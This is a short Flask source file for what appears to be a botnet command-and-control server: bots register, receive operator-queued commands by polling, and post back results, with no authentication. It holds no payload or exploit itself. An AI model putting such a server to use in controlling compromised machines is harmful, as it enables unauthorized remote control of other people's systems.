from flask import Flask, request, jsonify

app = Flask(__name__)

# Dictionary to store commands for bots
commands = {}

@app.route('/register', methods=['POST'])
def register_bot():
    bot_id = request.json['id']
    commands[bot_id] = []
    return jsonify({"message": "Bot registered", "id": bot_id}), 200

@app.route('/command/<bot_id>', methods=['POST'])
def add_command(bot_id):
    command = request.json['command']
    commands[bot_id].append(command)
    return jsonify({"message": "Command added"}), 200

@app.route('/get_commands/<bot_id>', methods=['GET'])
def get_commands(bot_id):
    bot_commands = commands.get(bot_id, [])
    return jsonify(bot_commands), 200

@app.route('/result', methods=['POST'])
def receive_result():
    data = request.json
    print(f"Received result from {data['id']}: {data['result']}")
    return jsonify({"message": "Result received"}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
